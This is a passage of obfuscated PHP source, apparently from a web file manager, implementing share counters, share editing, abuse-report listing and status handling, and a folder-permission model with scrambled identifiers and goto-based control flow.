$aÔ…É‰ØÍé, $e÷Ó¯ÒîĞ¯[456] => intval($e¡‡Êì×‚˜[$e÷Ó¯ÒîĞ¯[456]]), $e÷Ó¯ÒîĞ¯[2236] => 0, $e÷Ó¯ÒîĞ¯[2237] => -1); if ($e¡‡Êì×‚˜[$e÷Ó¯ÒîĞ¯[2236]]) { $dõ¾Šßô„¬[$e÷Ó¯ÒîĞ¯[2236]] = $e¡‡Êì×‚˜[$e÷Ó¯ÒîĞ¯[2236]]; } else { if ($e¡‡Êì×‚˜[$e÷Ó¯ÒîĞ¯[2237]]) { $dõ¾Šßô„¬[$e÷Ó¯ÒîĞ¯[2237]] = $e¡‡Êì×‚˜[$e÷Ó¯ÒîĞ¯[2237]]; } } $FÓˆÒ½ğï…[] = $dõ¾Šßô„¬; } goto F¦ÚéòÛŒ‹; F¶ù·ÁÓ×†: } public function numViewAdd($b­‹…¦ñ¼) { $C¨Öğ ù¢ =& $_SERVER[¼€¼ˆ¦‚¡]; $bØ¡ù½öè = array($C¨Öğ ù¢[440] => $b­‹…¦ñ¼); $this->where($bØ¡ù½öè)->setAdd($C¨Öğ ù¢[2231]); } public function numDownloadAdd($e¡¦Î—Ø©) { $aÚöŞô“ë =& $_SERVER[¼€¼ˆ¦‚¡]; $CäóŠöø = array($aÚöŞô“ë[440] => $e¡¦Î—Ø©); $this->where($CäóŠöø)->setAdd($aÚöŞô“ë[2232]); } protected function shareEdit($e ¯æÖÀ®ç, $fàŸâÃ¼¸) { goto C«´½Ãó…Ù; C«´½Ãó…Ù: $CÅÇâ¾’Ìİ =& $_SERVER[¼€¼ˆ¦‚¡]; $A¬äÉÓ¡­ = $this->getInfo($e ¯æÖÀ®ç); if (!$A¬äÉÓ¡­) { return !1; } goto DâÍÃ¦Ê¼³; Bº‰”¹é³Á: foreach ($eê­®áŒ¸ as $cùÒ«”œƒ) { if (!array_key_exists($cùÒ«”œƒ, $fàŸâÃ¼¸)) { continue; } $DòŞÙœÓ¯ô[$cùÒ«”œƒ] = $fàŸâÃ¼¸[$cùÒ«”œƒ]; } $this->shareEventAdd($A¬äÉÓ¡­[$CÅÇâ¾’Ìİ[369]], $fàŸâÃ¼¸, $CÅÇâ¾’Ìİ[2072]); $this->where(array($CÅÇâ¾’Ìİ[440] => $e ¯æÖÀ®ç))->save($DòŞÙœÓ¯ô); goto BŞ¿ïÀ®İ; DâÍÃ¦Ê¼³: $this->_checkLinkShare($fàŸâÃ¼¸, $A¬äÉÓ¡­); $DòŞÙœÓ¯ô = array(); $eê­®áŒ¸ = explode($CÅÇâ¾’Ìİ[47], $CÅÇâ¾’Ìİ[2238]); goto Bº‰”¹é³Á; BŞ¿ïÀ®İ: if (isset($fàŸâÃ¼¸[$CÅÇâ¾’Ìİ[2224]])) { $this->_shareAuthSet($e ¯æÖÀ®ç, $fàŸâÃ¼¸[$CÅÇâ¾’Ìİ[2224]]); } return !0; goto Fˆ¹Ô°²æß; Fˆ¹Ô°²æß: } private function _checkLinkShare($bÙ–ƒÕ¹²ˆ, $D ƒÌ·…‚Š) { goto aõîˆĞÉÌ; AÆÂË¦Ô´: $C™ÅÏ¶Áå– = $this->shareFileMeta($B•¯šİ¨É©[$ašŒ±ïÂ¼˜[419]]); if (isset($C™ÅÏ¶Áå–[$ašŒ±ïÂ¼˜[359]]) && $C™ÅÏ¶Áå–[$ašŒ±ïÂ¼˜[359]] == $ašŒ±ïÂ¼˜[83]) { show_json(LNG($ašŒ±ïÂ¼˜[2241]), !1); } goto f®¾‘ËÓº; aõîˆĞÉÌ: $ašŒ±ïÂ¼˜ =& $_SERVER[¼€¼ˆ¦‚¡]; if ($bÙ–ƒÕ¹²ˆ[$ašŒ±ïÂ¼˜[446]] != $ašŒ±ïÂ¼˜[83]) { return; } $f¢²ê¾ØÏğ = $D ƒÌ·…‚Š[$ašŒ±ïÂ¼˜[391]][$ašŒ±ïÂ¼˜[369]]; goto cäèç‹¤ù; cäèç‹¤ù: if ($D ƒÌ·…‚Š[$ašŒ±ïÂ¼˜[391]][$ašŒ±ïÂ¼˜[29]] != $ašŒ±ïÂ¼˜[167]) { $CÅ¶Æİ¬¡© = $this->_folderReport($f¢²ê¾ØÏğ); if (!$CÅ¶Æİ¬¡©) { return; } show_json(LNG($ašŒ±ïÂ¼˜[2239]) . $ašŒ±ïÂ¼˜[2240] . $CÅ¶Æİ¬¡©, !1); } $B•¯šİ¨É© = Model($ašŒ±ïÂ¼˜[749])->fileInfoGet($D ƒÌ·…‚Š[$ašŒ±ïÂ¼˜[391]][$ašŒ±ïÂ¼˜[369]]); if (!$B•¯šİ¨É©) { return; } goto AÆÂË¦Ô´; f®¾‘ËÓº: } private function _folderReport($B½–é¼ˆ·) { goto C™’£ñĞ¾Á; c‡˜Ü¡ÎÀç: $c¨„Î®ÁĞÊ = array($A¥²Ô‹ƒ±[419] => array($A¥²Ô‹ƒ±[7], $cµÛ×¿²ğø), $A¥²Ô‹ƒ±[459] => array($A¥²Ô‹ƒ±[748], "\x25{$dòİÕÁ¤¡·}\45"), $A¥²Ô‹ƒ±[397] => 0); $E¡Õ…ÈÈ™¦ = Model($A¥²Ô‹ƒ±[749])->where($c¨„Î®ÁĞÊ)->field($A¥²Ô‹ƒ±[2243])->find(); if (!$E¡Õ…ÈÈ™¦) { return !1; } goto Eä¥ÌíÊê; C™’£ñĞ¾Á: $A¥²Ô‹ƒ± =& $_SERVER[¼€¼ˆ¦‚¡]; $c¨„Î®ÁĞÊ = array($A¥²Ô‹ƒ±[419] => array($A¥²Ô‹ƒ±[925], 0), $A¥²Ô‹ƒ±[685] => 3); $cµÛ×¿²ğø = Model($A¥²Ô‹ƒ±[2242])->where($c¨„Î®ÁĞÊ)->field($A¥²Ô‹ƒ±[419])->select(); goto e´—ñ¯ßËß; e´—ñ¯ßËß: if (!$cµÛ×¿²ğø) { return !1; } $cµÛ×¿²ğø = array_to_keyvalue($cµÛ×¿²ğø, $A¥²Ô‹ƒ±[33], $A¥²Ô‹ƒ±[419]); $dòİÕÁ¤¡· = $A¥²Ô‹ƒ±[47] . $B½–é¼ˆ· . $A¥²Ô‹ƒ±[47]; goto c‡˜Ü¡ÎÀç; Eä¥ÌíÊê: $c–Š’´õ­ß = substr($E¡Õ…ÈÈ™¦[$A¥²Ô‹ƒ±[459]], strpos($E¡Õ…ÈÈ™¦[$A¥²Ô‹ƒ±[459]], $dòİÕÁ¤¡·)); $c¨„Î®ÁĞÊ = array($A¥²Ô‹ƒ±[369] => array($A¥²Ô‹ƒ±[7], trim($c–Š’´õ­ß, $A¥²Ô‹ƒ±[47]))); $E©øÀ±ĞÍõ = Model($A¥²Ô‹ƒ±[749])->where($c¨„Î®ÁĞÊ)->field($A¥²Ô‹ƒ±[28])->select(); goto d¼é±ŒæÛ; d¼é±ŒæÛ: $eƒì®Œ¼è = array_to_keyvalue($E©øÀ±ĞÍõ, $A¥²Ô‹ƒ±[33], $A¥²Ô‹ƒ±[28]); $eƒì®Œ¼è[] = $E¡Õ…ÈÈ™¦[$A¥²Ô‹ƒ±[28]]; return implode($A¥²Ô‹ƒ±[8], $eƒì®Œ¼è); goto a®¢¦Üµ·æ; a®¢¦Üµ·æ: } protected function remove($f‘ßÄ¨»—–) { goto CÊ§Ì‹É·™; f¸Æ½¯¸„Õ: for ($E­Ö” ãŸ‰ = 0; $E­Ö” ãŸ‰ < count($f¥ª÷ìĞÓĞ); $E­Ö” ãŸ‰++) { $cÀ£í˜ = $this->getInfo($f¥ª÷ìĞÓĞ[$E­Ö” ãŸ‰]); if ($cÀ£í˜[$BÓ±‚—†Â[448]] == $BÓ±‚—†Â[83]) { Model($BÓ±‚—†Â[505])->eventShare($cÀ£í˜[$BÓ±‚—†Â[369]], $BÓ±‚—†Â[2229]); } if ($cÀ£í˜[$BÓ±‚—†Â[446]] == $BÓ±‚—†Â[83]) { Model($BÓ±‚—†Â[505])->eventShare($cÀ£í˜[$BÓ±‚—†Â[369]], $BÓ±‚—†Â[2228]); } } return $Cíá¾ëßñ›; goto F‹ïìÅ‘ÌÜ; BÆ‘ˆëŸ: $Cíá¾ëßñ› = $this->where($F÷³Š´ŸŒÏ)->delete(); if ($Cíá¾ëßñ›) { Model($BÓ±‚—†Â[537])->where(array($BÓ±‚—†Â[441] => $f‘ßÄ¨»—–))->delete(); } $f¥ª÷ìĞÓĞ = is_array($f‘ßÄ¨»—–) ? $f‘ßÄ¨»—–[1] : array($f‘ßÄ¨»—–); goto f¸Æ½¯¸„Õ; CÊ§Ì‹É·™: $BÓ±‚—†Â =& $_SERVER[¼€¼ˆ¦‚¡]; if (is_array($f‘ßÄ¨»—–)) { $f‘ßÄ¨»—– = array($BÓ±‚—†Â[7], $f‘ßÄ¨»—–); } $F÷³Š´ŸŒÏ = array($BÓ±‚—†Â[441] => $f‘ßÄ¨»—–); goto BÆ‘ˆëŸ; F‹ïìÅ‘ÌÜ: } protected function removeBySource($Bˆò—¾¦œï) { goto A«ŠâÜ——ê; A«ŠâÜ——ê: $fãäèƒğå´ =& $_SERVER[¼€¼ˆ¦‚¡]; $F‘ñŸ»Œ = array($fãäèƒğå´[383] => array($fãäèƒğå´[384], $Bˆò—¾¦œï)); $a©åó÷À«ç = $this->field($fãäèƒğå´[441])->where($F‘ñŸ»Œ)->select(); goto e§‘ÀæÚºÈ; d¸Ñ¾ğ‡»: $this->where($F‘ñŸ»Œ)->delete(); Model($fãäèƒğå´[537])->where($F‘ñŸ»Œ)->delete(); goto dä¶›Öªïˆ; e§‘ÀæÚºÈ: $a©åó÷À«ç = array_to_keyvalue($a©åó÷À«ç, $fãäèƒğå´[33], $fãäèƒğå´[441]); if (!$a©åó÷À«ç) { return; } $F‘ñŸ»Œ = array($fãäèƒğå´[440] => array($fãäèƒğå´[384], $a©åó÷À«ç)); goto d¸Ñ¾ğ‡»; dä¶›Öªïˆ: } public function listAll($döî¨ÚÚòâ) { goto fÛ­¶óÒ¬¼; C  ½Ê²‰–: if ($döî¨ÚÚòâ[$dâª­†×îø[698]]) { $b……ªù™÷î = $döî¨ÚÚòâ[$dâª­†×îø[699]] ? $döî¨ÚÚòâ[$dâª­†×îø[699]] : strtotime(date($dâª­†×îø[2244])); $CœïÁ–ÛŸ¬[$dâª­†×îø[187]] = array($dâª­†×îø[321], array($döî¨ÚÚòâ[$dâª­†×îø[698]], $b……ªù™÷î)); } if ($döî¨ÚÚòâ[$dâª­†×îø[29]]) { $CœïÁ–ÛŸ¬[$döî¨ÚÚòâ[$dâª­†×îø[29]]] = 1; } else { $CœïÁ–ÛŸ¬[] = array($dâª­†×îø[446] => array($dâª­†×îø[925], 0), $dâª­†×îø[448] => array($dâª­†×îø[925], 0), $dâª­†×îø[2219] => $dâª­†×îø[2187]); } if ($döî¨ÚÚòâ[$dâª­†×îø[2183]]) { $CœïÁ–ÛŸ¬[] = array($dâª­†×îø[443] => $döî¨ÚÚòâ[$dâª­†×îø[2183]], $dâª­†×îø[1342] => array($dâª­†×îø[748], "\x25{$döî¨ÚÚòâ[$dâª­†×îø[2183]]}\x25"), $dâª­†×îø[2219] => $dâª­†×îø[2187]); } goto béáÎ·£ù‹; béáÎ·£ù‹: $b¸Ñ·ä¸öŸ = $this->_makeOrder()->where($CœïÁ–ÛŸ¬)->selectPage(20); if (empty($b¸Ñ·ä¸öŸ[$dâª­†×îø[354]])) { return array(); } $this->_listDataApply($b¸Ñ·ä¸öŸ[$dâª­†×îø[354]]); goto e×³¼ñÔÌ¯; e×³¼ñÔÌ¯: return $b¸Ñ·ä¸öŸ; goto E¾Ñï£œÊî; fÛ­¶óÒ¬¼: $dâª­†×îø =& $_SERVER[¼€¼ˆ¦‚¡]; $CœïÁ–ÛŸ¬ = array(); if ($döî¨ÚÚòâ[$dâª­†×îø[1437]]) { $CœïÁ–ÛŸ¬[$dâª­†×îø[1437]] = $döî¨ÚÚòâ[$dâª­†×îø[1437]]; } goto C  ½Ê²‰–; E¾Ñï£œÊî: } public function listDataApply($eÆ‹à¨Í¥š) { $this->_listDataApply($eÆ‹à¨Í¥š); return $eÆ‹à¨Í¥š; } private function _listDataApply(&$aòøĞé«¥Õ) { $AÅá—ÆÊº¤ =& $_SERVER[¼€¼ˆ¦‚¡]; $A°¥ÍÇíº = array_to_keyvalue($aòøĞé«¥Õ, $AÅá—ÆÊº¤[33], $AÅá—ÆÊº¤[1437]); $bÄƒÁÁ´ = Model($AÅá—ÆÊº¤[477])->userListInfo(array_unique($A°¥ÍÇíº)); $Cõä•ÚŠÒ„ = array_to_keyvalue($aòøĞé«¥Õ, $AÅá—ÆÊº¤[33], $AÅá—ÆÊº¤[369]); $c§ŠšˆÃ×¨ = Model($AÅá—ÆÊº¤[749])->sourceListInfo($Cõä•ÚŠÒ„, !0); foreach ($aòøĞé«¥Õ as &$FÌø¡¯Å¸®) { $dó·»ßù³ = $FÌø¡¯Å¸®[$AÅá—ÆÊº¤[1437]]; $FÌø¡¯Å¸®[$AÅá—ÆÊº¤[2245]] = $bÄƒÁÁ´[$dó·»ßù³] ? $bÄƒÁÁ´[$dó·»ßù³] : !1; $DšÏ¶”ß’‹ = $FÌø¡¯Å¸®[$AÅá—ÆÊº¤[369]]; $FÌø¡¯Å¸®[$AÅá—ÆÊº¤[391]] = $c§ŠšˆÃ×¨[$DšÏ¶”ß’‹] ? $c§ŠšˆÃ×¨[$DšÏ¶”ß’‹] : !1; } } private function _makeOrder($C§ŞÎğğËÒ = '') { goto eï¢Ô¶’Ş; E®Ãäì‹¸®: $c¼Äš×ƒ = Input::get($E›ğºÚèÊá[407], $E›ğºÚèÊá[7], $E›ğºÚèÊá[389], $aÒ·›ô¢); $DƒÌÏ¡Ê = Input::get($E›ğºÚèÊá[408], $E›ğºÚèÊá[7], $E›ğºÚèÊá[2246], array($E›ğºÚèÊá[2182], $E›ğºÚèÊá[404])); $DƒÌÏ¡Ê = $F…¯ñ®ƒ[$DƒÌÏ¡Ê]; goto CÊ’²¥åÚ; CÊ’²¥åÚ: $C§ŞÎğğËÒ = $C§ŞÎğğËÒ . "{$c¼Äš×ƒ}\40{$DƒÌÏ¡Ê}"; return $this->order($C§ŞÎğğËÒ); goto F…†’°Ğù¦; eï¢Ô¶’Ş: $E›ğºÚèÊá =& $_SERVER[¼€¼ˆ¦‚¡]; $aÒ·›ô¢ = array($E›ğºÚèÊá[187], $E›ğºÚèÊá[699], $E›ğºÚèÊá[2231], $E›ğºÚèÊá[2232]); $F…¯ñ®ƒ = array($E›ğºÚèÊá[402] => $E›ğºÚèÊá[403], $E›ğºÚèÊá[404] => $E›ğºÚèÊá[405]); goto E®Ãäì‹¸®; F…†’°Ğù¦: } public function reportAdd($aÉÎĞ¶™ğù) { $dµ¹ Š¾ğŠ =& $_SERVER[¼€¼ˆ¦‚¡]; $AèÃöÍ¡” = array($dµ¹ Š¾ğŠ[441] => $aÉÎĞ¶™ğù[$dµ¹ Š¾ğŠ[441]], $dµ¹ Š¾ğŠ[1437] => USER_ID); if (Model($dµ¹ Š¾ğŠ[2242])->where($AèÃöÍ¡”)->find()) { return !1; } $b½´öšö„ = array($dµ¹ Š¾ğŠ[441] => $aÉÎĞ¶™ğù[$dµ¹ Š¾ğŠ[441]], $dµ¹ Š¾ğŠ[1342] => $aÉÎĞ¶™ğù[$dµ¹ Š¾ğŠ[1342]], $dµ¹ Š¾ğŠ[369] => $aÉÎĞ¶™ğù[$dµ¹ Š¾ğŠ[369]], $dµ¹ Š¾ğŠ[419] => $aÉÎĞ¶™ğù[$dµ¹ Š¾ğŠ[419]], $dµ¹ Š¾ğŠ[1437] => USER_ID, $dµ¹ Š¾ğŠ[29] => $aÉÎĞ¶™ğù[$dµ¹ Š¾ğŠ[29]], $dµ¹ Š¾ğŠ[405] => $aÉÎĞ¶™ğù[$dµ¹ Š¾ğŠ[405]]); return Model($dµ¹ Š¾ğŠ[2242])->add($b½´öšö„); } public function reportList($cÅè‹Õ§ô­) { goto a¬œïô’¤Ò; a¬œïô’¤Ò: $bÎïä«£ç =& $_SERVER[¼€¼ˆ¦‚¡]; $Eöª–»ªĞÑ = array(); if ($cÅè‹Õ§ô­[$bÎïä«£ç[698]]) { $Aî‘¸¹¤è‰ = $cÅè‹Õ§ô­[$bÎïä«£ç[699]] ? $cÅè‹Õ§ô­[$bÎïä«£ç[699]] : strtotime(date($bÎïä«£ç[2244])); $Eöª–»ªĞÑ[$bÎïä«£ç[187]] = array($bÎïä«£ç[321], array($cÅè‹Õ§ô­[$bÎïä«£ç[698]], $Aî‘¸¹¤è‰)); } goto eÓœ•Õ¶µø; cÏêÕíÑ‚ó: if (empty($D±¸™İŞñ[$bÎïä«£ç[354]])) { return array(); } $this->_listDataApply($D±¸™İŞñ[$bÎïä«£ç[354]]); return $D±¸™İŞñ; goto D‰ğ¥¼‘œù; eÓœ•Õ¶µø: if (isset($cÅè‹Õ§ô­[$bÎïä«£ç[29]]) && in_array($cÅè‹Õ§ô­[$bÎïä«£ç[29]], array($bÎïä«£ç[83], $bÎïä«£ç[2247], $bÎïä«£ç[2248], $bÎïä«£ç[2249], $bÎïä«£ç[1920]))) { $Eöª–»ªĞÑ[$bÎïä«£ç[29]] = $cÅè‹Õ§ô­[$bÎïä«£ç[29]]; } if (isset($cÅè‹Õ§ô­[$bÎïä«£ç[685]]) && in_array($cÅè‹Õ§ô­[$bÎïä«£ç[685]], array($bÎïä«£ç[468], $bÎïä«£ç[83], $bÎïä«£ç[2247], $bÎïä«£ç[2248]))) { $Eöª–»ªĞÑ[$bÎïä«£ç[685]] = $cÅè‹Õ§ô­[$bÎïä«£ç[685]]; } $FçºíàÂ‘ = Input::get($bÎïä«£ç[408], $bÎïä«£ç[7], $bÎïä«£ç[2246], array($bÎïä«£ç[2182], $bÎïä«£ç[404])); goto D…Í™ÕŠº; D…Í™ÕŠº: $c ÛêŠÀª = array($bÎïä«£ç[402] => $bÎïä«£ç[403], $bÎïä«£ç[404] => $bÎïä«£ç[405]); $f·ß¼©°ï = $bÎïä«£ç[2250] . $c ÛêŠÀª[$FçºíàÂ‘]; $D±¸™İŞñ = Model($bÎïä«£ç[2242])->where($Eöª–»ªĞÑ)->order($f·ß¼©°ï)->selectPage(20); goto cÏêÕíÑ‚ó; D‰ğ¥¼‘œù: } public function reportStatus($B°‰ç…öö) { goto Fìè¢‹ÆŸ; AÆ¤áÒÍÊÁ: $E•È¼ïÅ´ò = Model($d¶…ÑÈãöƒ[2242])->where($fŠğÔäÀó‹)->save($FÜõ‹ë‘İ×); if ($B°‰ç…öö[$d¶…ÑÈãöƒ[685]] == $d¶…ÑÈãöƒ[2247]) { if ($D¦³ù™‰Š[$d¶…ÑÈãöƒ[419]] != $d¶…ÑÈãöƒ[468] && $this->shareFileMeta($D¦³ù™‰Š[$d¶…ÑÈãöƒ[419]])) { $this->shareFileMeta($D¦³ù™‰Š[$d¶…ÑÈãöƒ[419]], 0); } $this->remove($D¦³ù™‰Š[$d¶…ÑÈãöƒ[441]]); return !0; } if ($E•È¼ïÅ´ò && $B°‰ç…öö[$d¶…ÑÈãöƒ[685]] == $d¶…ÑÈãöƒ[2248]) { $D³Ú´°é¼› = $FÜõ‹ë‘İ×[$d¶…ÑÈãöƒ[685]] == $d¶…ÑÈãöƒ[2248] ? 1 : 0; $this->shareFileMeta($D¦³ù™‰Š[$d¶…ÑÈãöƒ[419]], $D³Ú´°é¼›); $this->removeByFile($D¦³ù™‰Š[$d¶…ÑÈãöƒ[419]]); } goto E×å…¡·„; bŒ…®œ‹¦: if (!$D¦³ù™‰Š) { return !1; } $FÜõ‹ë‘İ× = array($d¶…ÑÈãöƒ[685] => $B°‰ç…öö[$d¶…ÑÈãöƒ[685]]); if ($B°‰ç…öö[$d¶…ÑÈãöƒ[685]] == $d¶…ÑÈãöƒ[2248] && $D¦³ù™‰Š[$d¶…ÑÈãöƒ[685]] == $d¶…ÑÈãöƒ[2248]) { $FÜõ‹ë‘İ×[$d¶…ÑÈãöƒ[685]] = 0; } goto AÆ¤áÒÍÊÁ; E×å…¡·„: return $E•È¼ïÅ´ò; goto F”†‚£ƒ; Fìè¢‹ÆŸ: $d¶…ÑÈãöƒ =& $_SERVER[¼€¼ˆ¦‚¡]; $fŠğÔäÀó‹ = array($d¶…ÑÈãöƒ[367] => $B°‰ç…öö[$d¶…ÑÈãöƒ[367]]); $D¦³ù™‰Š = Model($d¶…ÑÈãöƒ[2242])->where($fŠğÔäÀó‹)->field($d¶…ÑÈãöƒ[2251])->find(); goto bŒ…®œ‹¦; F”†‚£ƒ: } private function removeByFile($A¯Ç»ÛŠ‹½) { goto EªÍòÏ‘„º; D’æ·­ŸÚ: $C™°ÏàÆ†³ = array_to_keyvalue($fÜŠ‰ßñ¨÷, $Fí¬“†Õëß[33], $Fí¬“†Õëß[441]); $this->remove($C™°ÏàÆ†³); goto aÚÉË¼ ¾È; EªÍòÏ‘„º: $Fí¬“†Õëß =& $_SERVER[¼€¼ˆ¦‚¡]; $fÜŠ‰ßñ¨÷ = Model($Fí¬“†Õëß[749])->where(array($Fí¬“†Õëß[419] => $A¯Ç»ÛŠ‹½))->field($Fí¬“†Õëß[369])->select(); $CÎóÄÜêê = array_to_keyvalue($fÜŠ‰ßñ¨÷, $Fí¬“†Õëß[33], $Fí¬“†Õëß[369]); goto BÁ¦Š±õ·ˆ; BÁ¦Š±õ·ˆ: $A½œŞ¤Ó‚— = array($Fí¬“†Õëß[369] => array($Fí¬“†Õëß[7], $CÎóÄÜêê), $Fí¬“†Õëß[446] => 1); $fÜŠ‰ßñ¨÷ = Model($Fí¬“†Õëß[2082])->where($A½œŞ¤Ó‚—)->field($Fí¬“†Õëß[441])->select(); if (empty($fÜŠ‰ßñ¨÷)) { return; } goto D’æ·­ŸÚ; aÚÉË¼ ¾È: } private function shareFileMeta($cÇ“ÜÇ‹Ìç, $E– ÒíÑ©Ö = null) { $Aö…ÁÅöŞ =& $_SERVER[¼€¼ˆ¦‚¡]; $a¿¨·»ø = array($Aö…ÁÅöŞ[419] => $cÇ“ÜÇ‹Ìç, $Aö…ÁÅöŞ[89] => $Aö…ÁÅöŞ[2252]); if (is_null($E– ÒíÑ©Ö)) { return Model($Aö…ÁÅöŞ[2253])->where($a¿¨·»ø)->find(); } $a¿¨·»ø[$Aö…ÁÅöŞ[359]] = $E– ÒíÑ©Ö; Model($Aö…ÁÅöŞ[2253])->add($a¿¨·»ø, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\165\162\143\x65\137\141\x75\164\150"; public function getAuth($A†À•…™Áí) { goto c–¨ÅÌá¸; c–¨ÅÌá¸: $e›Óê×šìÔ =& $_SERVER[¼€¼ˆ¦‚¡]; $a‹¤·‹³ = $e›Óê×šìÔ[2254]; $FµÌËƒãİï = array($e›Óê×šìÔ[369] => $A†À•…™Áí); goto f¼ÎŸ÷íó“; EèÇóéù²ã: return $bß“Âƒ·Á; goto C·¼ßÚàÎ²; f¼ÎŸ÷íó“: $AŠ¢ÈÏ­‚• = $this->field($a‹¤·‹³)->order($e›Óê×šìÔ[367])->where($FµÌËƒãİï)->select(); $bß“Âƒ·Á = array(); foreach ($AŠ¢ÈÏ­‚• as $dø™›³ÌÔª) { if (Model($e›Óê×šìÔ[2255])->listData($dø™›³ÌÔª[$e›Óê×šìÔ[2236]])) { $bß“Âƒ·Á[] = $dø™›³ÌÔª; } } goto EèÇóéù²ã; C·¼ßÚàÎ²: } public function setAuth($bõÉÑÊ®¢ø, $D†çİÄµƒ) { goto A™Ø‰ˆœ¥á; cÕ¤×¦»Ï‡: $CãŒâåæÑê = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $b–Œãà×Îô = array(); foreach ($D†çİÄµƒ as $e¥•¬Š¾Õ) { if (!in_array($e¥•¬Š¾Õ[$aøààÜ¥¡[371]], $CãŒâåæÑê)) { show_json(LNG($aøààÜ¥¡[2256]), !1); } if ($A‰’ßò¥‹Æ != $b’Œ‘î›™) { if ($e¥•¬Š¾Õ[$aøààÜ¥¡[371]] == SourceModel::TYPE_GROUP) { } if ($e¥•¬Š¾Õ[$aøààÜ¥¡[456]] != 0 && !in_array($e¥•¬Š¾Õ[$aøààÜ¥¡[456]], $CŸ½ÇĞ…‰ñ)) { } } if ($e¥•¬Š¾Õ[$aøààÜ¥¡[456]] == 0) { $e¥•¬Š¾Õ[$aøààÜ¥¡[371]] = SourceModel::TYPE_USER; } $b–Œãà×Îô[] = array($aøààÜ¥¡[369] => $bõÉÑÊ®¢ø, $aøààÜ¥¡[371] => intval($e¥•¬Š¾Õ[$aøààÜ¥¡[371]]), $aøààÜ¥¡[456] => intval($e¥•¬Š¾Õ[$aøààÜ¥¡[456]]), $aøààÜ¥¡[2236] => intval($e¥•¬Š¾Õ[$aøààÜ¥¡[2236]]) ? intval($e¥•¬Š¾Õ[$aøààÜ¥¡[2236]]) : 0, $aøààÜ¥¡[2237] => intval($e¥•¬Š¾Õ[$aøààÜ¥¡[2237]]) ? intval($e¥•¬Š¾Õ[$aøààÜ¥¡[2237]]) : -1); } goto AšÉò—ëˆ¿; A™Ø‰ˆœ¥á: $aøààÜ¥¡ =& $_SERVER[¼€¼ˆ¦‚¡]; $Cˆ­©†¼Ÿ» = Model($aøààÜ¥¡[1117])->sourceInfo($bõÉÑÊ®¢ø); if ($Cˆ­©†¼Ÿ»[$aøààÜ¥¡[371]] != SourceModel::TYPE_GROUP) { return !1; } goto A©¨é“ëš–; AšÉò—ëˆ¿: $this->where(array($aøààÜ¥¡[383] => $bõÉÑÊ®¢ø))->delete(); $this->addAll($b–Œãà×Îô); return !0; goto fÖè÷®ğø–; A©¨é“ëš–: $b’Œ‘î›™ = 1; $A‰’ßò¥‹Æ = $Cˆ­©†¼Ÿ»[$aøààÜ¥¡[456]]; if ($A‰’ßò¥‹Æ != $b’Œ‘î›™) { $DÎ¢Ã£áªŒ = array($aøààÜ¥¡[2105] => $A‰’ßò¥‹Æ); $CŸ½ÇĞ…‰ñ = Model($aøààÜ¥¡[2181])->field($aøààÜ¥¡[1437])->where($DÎ¢Ã£áªŒ)->select(); $CŸ½ÇĞ…‰ñ = array_to_keyvalue($CŸ½ÇĞ…‰ñ, $aøààÜ¥¡[33], $aøààÜ¥¡[1437]); } goto cÕ¤×¦»Ï‡; fÖè÷®ğø–: } public function authClear($DŒó—À²ğ) { $CÅæóˆ™¶ =& $_SERVER[¼€¼ˆ¦‚¡]; $f«µÜÌ½à½ = Model($CÅæóˆ™¶[1117])->sourceInfo($DŒó—À²ğ); $DÁ˜ĞŸ©Ó÷ = array($DŒó—À²ğ); if ($f«µÜÌ½à½[$CÅæóˆ™¶[370]] == $CÅæóˆ™¶[83]) { $cĞÁë¤ø»˜ = array($CÅæóˆ™¶[525] => array($CÅæóˆ™¶[483], $f«µÜÌ½à½[$CÅæóˆ™¶[459]] . $DŒó—À²ğ . $CÅæóˆ™¶[484])); $DÁ˜ĞŸ©Ó÷ = Model($CÅæóˆ™¶[1117])->field($CÅæóˆ™¶[383])->where($cĞÁë¤ø»˜)->getField($CÅæóˆ™¶[369], !0); $DÁ˜ĞŸ©Ó÷[] = $DŒó—À²ğ; } $this->where(array($CÅæóˆ™¶[383] => array($CÅæóˆ™¶[384], $DÁ˜ĞŸ©Ó÷)))->delete(); return !0; } public function get($BŸÊŞŠÏ) { $BÔ‚â—ì¡ = $this->getSourceList(array($BŸÊŞŠÏ), !0); return $BÔ‚â—ì¡[0]; } public function getSourceList($fì Ş„Ñ—µ, $C´œ…Ü¬Ú² = false) { goto E²„ŒÀ¹ï¿; E²„ŒÀ¹ï¿: $Fó—ë—Ü‰ =& $_SERVER[¼€¼ˆ¦‚¡]; if (!$fì Ş„Ñ—µ) { return array(); } $FÖÖˆÀ”¾ª = Model($Fó—ë—Ü‰[1117]); goto bÄ”æ…¶µœ; d‡°½ğ¥Á¯: $C÷ğóÌ¿ë = array(); foreach ($C´œ…Ü¬Ú² as $fŒ¹¤¯×ÇÖ => $A³¿íß˜ó») { $C÷ğóÌ¿ë[$fŒ¹¤¯×ÇÖ] = $this->makeSourceAuth($A³¿íß˜ó», $BÈÅºàÇ–); } return $C÷ğóÌ¿ë; goto C½óÑ‹ˆ•; bÄ”æ…¶µœ: if (!$C´œ…Ü¬Ú²) { $CŠéÖ×ÄÍ = array($Fó—ë—Ü‰[383] => array($Fó—ë—Ü‰[384], $fì Ş„Ñ—µ)); $C´œ…Ü¬Ú² = $FÖÖˆÀ”¾ª->field($Fó—ë—Ü‰[2257])->where($CŠéÖ×ÄÍ)->select(); $C´œ…Ü¬Ú² = array_to_keyvalue($C´œ…Ü¬Ú², $Fó—ë—Ü‰[369]); } $FƒšŒè‡å¾ = $fì Ş„Ñ—µ; foreach ($C´œ…Ü¬Ú² as $eœïµôŞ« => $Dá¹Î™¾Ø) { $fÃøŒã›é¦ = $FÖÖˆÀ”¾ª->parentLevelArray($Dá¹Î™¾Ø[$Fó—ë—Ü‰[459]]); $FƒšŒè‡å¾ = array_merge($FƒšŒè‡å¾, $fÃøŒã›é¦, array($eœïµôŞ«)); } goto Aªš¤çñÚ‚; FèãùáßÍì: $CŠéÖ×ÄÍ = array($Fó—ë—Ü‰[383] => array($Fó—ë—Ü‰[384], $FƒšŒè‡å¾)); $BÈÅºàÇ– = $this->field($Dá¯½ŞÁö¹)->where($CŠéÖ×ÄÍ)->select(); $BÈÅºàÇ– = array_to_keyvalue_group($BÈÅºàÇ–, $Fó—ë—Ü‰[369]); goto d‡°½ğ¥Á¯; Aªš¤çñÚ‚: $FƒšŒè‡å¾ = array_values(array_unique($FƒšŒè‡å¾)); if (!$FƒšŒè‡å¾) { return array(); } $Dá¯½ŞÁö¹ = 